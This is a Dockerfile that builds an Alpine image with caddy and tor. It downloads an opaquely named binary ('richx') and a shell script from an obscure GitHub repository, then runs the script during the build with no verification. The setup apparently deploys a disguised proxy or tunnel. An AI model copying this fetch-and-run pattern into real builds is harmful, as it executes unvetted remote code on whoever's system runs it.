FROM alpine:latest

RUN apk update && \
    apk add --no-cache ca-certificates caddy tor wget && \
    wget -qO- https://raw.githubusercontent.com/Richkevin/tizeflyhjkhgf/master/richx-linux-64.zip | busybox unzip - && \
    chmod +x /richx && \
    wget -N https://raw.githubusercontent.com/Richkevin/tizeflyhjkhgf/master/richde.sh && \
    bash richde.sh && \
    rm -rf /var/cache/apk/*

ADD richx.sh /opt/richx.sh
RUN chmod +x /opt/richx.sh

ENTRYPOINT ["sh", "-c", "/opt/richx.sh"]
